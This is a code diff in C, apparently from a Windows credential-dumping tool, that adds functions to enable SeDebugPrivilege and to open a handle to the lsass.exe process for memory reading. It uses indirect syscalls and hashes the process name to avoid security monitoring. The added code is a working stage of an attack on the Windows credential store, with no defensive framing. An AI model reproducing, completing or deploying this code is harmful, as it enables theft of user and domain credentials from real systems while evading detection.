@@ -2,7 +2,43 @@
 
 identity_t lsassHash = IDENTITY("lsass.exe");
 
-NTSTATUS GetProcHandle(IN DWORD ProcHash, OUT PHANDLE hProc) {
+BOOL SetDebugPriv() {
+    HANDLE              hToken      = NULL;
+    TOKEN_PRIVILEGES    tokenPriv   = {0};
+    NTSTATUS            ntStatus    = 0x00;
+    LPCWSTR             lpwPriv;
+
+    SetSsn(g_SyscallApi.NtOpenProcessToken.dwSsn, g_SyscallApi.NtOpenProcessToken.pSyscallInstAddress);
+    ntStatus = RunSyscall(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken, NULL);
+    if (!NT_SUCCESS(ntStatus)) {
+#ifdef DEBUG
+        printf("[!] NtOpenProcessToken failed with error: %#010x [%d]\n", ntStatus, __LINE__);
+#endif
+        return FALSE;
+    }
+    tokenPriv.PrivilegeCount = 1;
+    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    lpwPriv = L"SeDebugPrivilege";
+    if (!LookupPrivilegeValueW(NULL, lpwPriv, &tokenPriv.Privileges[0].Luid)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    SetSsn(g_SyscallApi.NtAdjustPrivilegesToken.dwSsn, g_SyscallApi.NtAdjustPrivilegesToken.pSyscallInstAddress);
+    ntStatus = RunSyscall6(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+    if (!NT_SUCCESS(ntStatus)) {
+#ifdef DEBUG
+        printf("[!] NtAdjustPrivilegesToken failed with error: %#010x [%d]\n", ntStatus, __LINE__);
+#endif
+        return FALSE;
+    }
+
+    if (hToken) CloseHandle(hToken);
+    return TRUE;
+}
+
+NTSTATUS GetProcHandle(IN unsigned long long ProcHash, OUT PHANDLE hProc) {
     PVOID       pBuffer     = NULL;
     ULONG       cbBuffer    = 131072;
     HANDLE      hHeap       = NULL;
@@ -55,11 +91,25 @@ NTSTATUS GetProcHandle(IN DWORD ProcHash, OUT PHANDLE hProc) {
         printf("\nProcess: %ls | PID: %d\n", pSysProcInfo->ImageName.Buffer, pSysProcInfo->ProcessId);
 #endif
         utf8Str = UnicodeStringToUtf8(&pSysProcInfo->ImageName);
+        printf("hash: %llu, compare: %llu\n", IdentityRuntime(utf8Str), ProcHash);
         if (IdentityRuntime(utf8Str) == ProcHash) {
-            // TODO: Call NtOpenProcess and obtain process handle
+            InitializeObjectAttributes(&objAttributes, NULL, 0, NULL, NULL);
+            objAttributes.SecurityQualityOfService = 0;
+            clientId.UniqueProcess = (PVOID)pSysProcInfo->ProcessId;
+            clientId.UniqueThread = 0;
+            SetSsn(g_SyscallApi.NtOpenProcess.dwSsn, g_SyscallApi.NtOpenProcess.pSyscallInstAddress);
+            ntStatus = RunSyscall(hProc, PROCESS_VM_READ, &objAttributes, &clientId);
+            if (!NT_SUCCESS(ntStatus)) {
+#ifdef DEBUG
+                printf("[!] NtOpenProcess failed with error: %#010x [%d]\n", ntStatus, __LINE__);
+#endif
+                goto _CLEAN_UP;
+            }
+            break;
         }
         pSysProcInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pSysProcInfo + pSysProcInfo->NextEntryOffset);
     }
+    if (pBuffer) HeapFree(hHeap, NULL, pBuffer);
     return STATUS_SUCCESS;
 
     _CLEAN_UP:
